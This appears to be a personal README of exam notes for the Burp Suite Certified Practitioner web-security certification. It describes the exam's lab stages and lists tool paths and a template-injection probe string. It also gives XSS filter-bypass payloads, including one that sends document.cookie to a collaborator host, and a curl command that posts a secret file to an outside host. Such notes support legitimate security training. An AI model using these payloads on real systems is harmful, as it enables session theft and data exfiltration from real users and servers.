# BSCP
Burp Suite Certified Practitioner exam notes

---------

You will have four hours to complete the Burp Suite Certified Practitioner exam. There are two applications, and each application contains deliberate vulnerabilities. This means that each application can be completed in three stages:

1. Access any user account.
2. Use your user account to access the admin interface, perhaps by elevating your privileges or compromising the administrator account.
3. Use the admin interface to read the contents of `/home/carlos/secret` from the server's filesystem, and submit it using "submit solution".

[Username list](https://portswigger.net/web-security/authentication/auth-lab-usernames) 

[Password list](https://portswigger.net/web-security/authentication/auth-lab-passwords)

If you find an SSRF vulnerability, you can use it to read files by accessing an internal-only service, running on localhost on port `6566`.

`${{<%[%'"}}%\`

java path
```
D:\Application\java\jdk-11.0.20\bin\java.exe
```
ysoserial path
```
D:\Tools\tools\ysoserial\ysoserial-all.jar
```

XSS Bypass

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads

```
eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))   <--  [echo -n "alert(document.cookie)" | base64 == YWxlcnQoZG9jdW1lbnQuY29va2llKQ==]
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
window['alert'](document['domain'])
window["doc"+"ument"]

location="http://google.com"
document.location = "http://google.com"
document.location="https://COLLABORATOR.com?c="+document.cookie
document.location.href="http://google.com"
window.location.assign("http://google.com")
window['location']['href']="http://google.com"





```

```
curl http://colab.net -d @/home/carlos/secret

```












[![image](https://github.com/Manoj-Mukund/BSCP/assets/83630751/76c816f9-3c59-4a86-88b2-9b93c64402db)]()

